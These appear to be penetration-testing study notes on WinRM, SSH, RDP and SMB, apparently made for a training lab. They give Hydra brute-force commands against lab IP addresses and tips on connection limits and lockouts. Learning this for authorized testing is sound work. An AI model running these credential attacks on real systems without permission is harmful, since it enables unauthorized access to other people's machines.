# Network Services

## Overview

During penetration tests, networks commonly expose services used for:
- Remote administration
- File sharing
- Authentication
- Database access
- Communication

Common services include:
- FTP
- SMB
- NFS
- SSH
- WinRM
- RDP
- MSSQL
- LDAP
- VNC
- SMTP
- Telnet :contentReference[oaicite:0]{index=0}  

These services usually rely on:
- Username/password authentication
- Keys/certificates
- Default configurations

---

# WinRM

## Overview

Windows Remote Management (WinRM) is Microsoft's implementation of:
```text
WS-Management Protocol
```

Used for:
- Remote command execution
- Windows administration
- PowerShell remoting

Default ports:
- 5985 → HTTP
- 5986 → HTTPS

---

# SSH

## Overview

Secure Shell (SSH) is used for:
- Remote command execution
- Secure file transfer

Default port:
```text
22
```

SSH uses:
- Symmetric encryption
- Asymmetric encryption
- Hashing

---

# Hydra - SSH Bruteforce

## Main Command

```bash
hydra -L user.list -P password.list ssh://10.129.42.197
```

---

# Important Note

SSH often limits parallel connections.

Recommended:
```bash
-t 4
```

---

# Connect via SSH

## Main Command

```bash
ssh user@10.129.42.197
```

---

# RDP

## Overview

Remote Desktop Protocol (RDP) allows remote GUI access to Windows systems.

Default port:
```text
3389
```

Used for:
- Remote administration
- GUI interaction

---

# Hydra - RDP Bruteforce

## Main Command

```bash
hydra -L user.list -P password.list rdp://10.129.42.197
```

---

# Important Note

RDP servers dislike many parallel connections.

Recommended:
```bash
-t 1
```

or

```bash
-t 4
```

# SMB

## Overview

Server Message Block (SMB) is used for:
- File sharing
- Printer sharing
- Network communication

Default port:
```text
445
```

SMB is commonly used in Windows environments.

---

# Hydra - SMB Bruteforce

## Main Command

```bash
hydra -L user.list -P password.list smb://10.129.42.197
```

---

# SMBv3 Issue

Older Hydra versions may fail with SMBv3.

Example error:

```text
[ERROR] invalid reply from target
```

# Key Points

- WinRM commonly used in Windows administration
- Evil-WinRM provides PowerShell access
- SSH is standard for Linux remote management
- SMB often exposes sensitive shares
- Hydra supports brute-forcing multiple protocols
- NetExec is highly useful for authentication attacks

---

# Important Notes

- Many services use default credentials
- Parallel bruteforce attempts may trigger lockouts
- SMBv3 may break older Hydra versions
- Password reuse increases attack success
- Always enumerate shares after SMB authentication

---

# One-Line Revision

Network services such as WinRM, SSH, RDP, and SMB are common attack targets for authentication attacks, remote access, and lateral movement.
